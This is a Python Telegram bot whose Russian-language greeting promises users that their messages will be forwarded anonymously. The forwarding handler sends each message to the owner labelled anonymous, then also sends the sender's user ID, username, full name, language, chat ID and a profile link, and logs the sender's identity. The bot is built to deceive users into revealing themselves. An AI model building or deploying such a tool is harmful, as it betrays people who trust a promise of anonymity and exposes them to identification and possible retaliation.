import logging
import asyncio
from telegram import Update, BotCommand
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "YOUR_TOKEN"
YOUR_USER_ID = "YOUR_USER_ID"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Привет! Отправьте мне любое сообщение, и я передам его анонимно."
    )

async def forward_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        user = update.effective_user
        chat = update.effective_chat
        message = update.message

        sender_info = {
            'user_id': user.id,
            'username': user.username or "No username",
            'first_name': user.first_name or "No first name",
            'last_name': user.last_name or "No last name",
            'language_code': user.language_code or "Unknown",
            'is_premium': getattr(user, 'is_premium', False),
            'chat_id': chat.id,
            'chat_type': chat.type,
            'message_id': message.message_id,
            'date': message.date.strftime("%Y-%m-%d %H:%M:%S UTC")
        }

        message_text = message.text

        anonymous_message = f"📩 Anonymous Message: {message_text}"
        await context.bot.send_message(chat_id=YOUR_USER_ID, text=anonymous_message)

        sender_details = f"""👤 Sender Information:
• User ID: {sender_info['user_id']}
• Username: @{sender_info['username']}
• Name: {sender_info['first_name']} {sender_info['last_name']}
• Language: {sender_info['language_code']}
• Premium: {sender_info['is_premium']}
• Chat ID: {sender_info['chat_id']}
• Chat Type: {sender_info['chat_type']}
• Message ID: {sender_info['message_id']}
• Sent: {sender_info['date']}

🔗 Profile Link: tg://user?id={sender_info['user_id']}"""
        await context.bot.send_message(chat_id=YOUR_USER_ID, text=sender_details)

        await update.message.reply_text("Сообщение отправлено! Желаете отправить новое?")
        logger.info(f"Message from User {sender_info['user_id']} (@{sender_info['username']}): {message_text}")

    except Exception as e:
        logger.error(f"Error forwarding message: {e}")
        await update.message.reply_text("❌ Извините, произошла ошибка при отправке сообщения.")

async def setup_bot(application: Application) -> None:
    try:
        commands = [
            BotCommand("start", "Начать отправку анонимных сообщений")
        ]
        await application.bot.set_my_commands(commands)

        bot_info = await application.bot.get_me()
        print(f"✅ Bot '{bot_info.first_name}' (@{bot_info.username}) is ready!")
        print(f"🔗 Bot link: https://t.me/{bot_info.username}")

    except Exception as e:
        logger.error(f"Error setting up bot: {e}")

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, forward_message))

    if application.job_queue:
        application.job_queue.run_once(
            lambda context: asyncio.create_task(setup_bot(application)),
            when=1
        )
    else:
        asyncio.run(setup_bot(application))

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
